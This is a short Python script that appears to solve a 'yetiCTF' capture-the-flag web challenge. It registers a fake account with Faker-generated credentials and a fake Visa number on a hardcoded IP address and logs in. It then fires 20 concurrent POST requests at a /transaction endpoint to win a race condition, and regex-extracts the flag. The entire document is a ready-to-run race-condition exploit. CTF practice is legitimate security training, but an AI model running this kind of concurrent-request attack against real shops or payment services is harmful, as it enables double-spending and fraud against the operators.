from requests import Session
from multiprocessing.dummy import Pool
from faker import Faker
from re import search

f = Faker()
s = Session()

username = f.user_name()
password = f.password()
email = f.email()
visa = f.credit_card_number('visa')
url = 'http://135.181.200.140:8090'
pool = Pool(20)

s.get(f"{url}")
data = {"login":username, "password":password, "email":email, "card":visa, "submit":"submit"}
r = s.post(f"{url}/register", data=data)
r = s.post(f"{url}/login", data={"login":username, "password":password, "submit":"submit"})


futures = []

for i in range(20):
    futures.append(pool.apply_async(s.post, [f'{url}/transaction'], dict(data={"count":50})))

for future in futures:
    future.get()
    
flag = search("yetiCTF{(.*?)}", s.get(f"{url}").text).group(0)
print(flag)
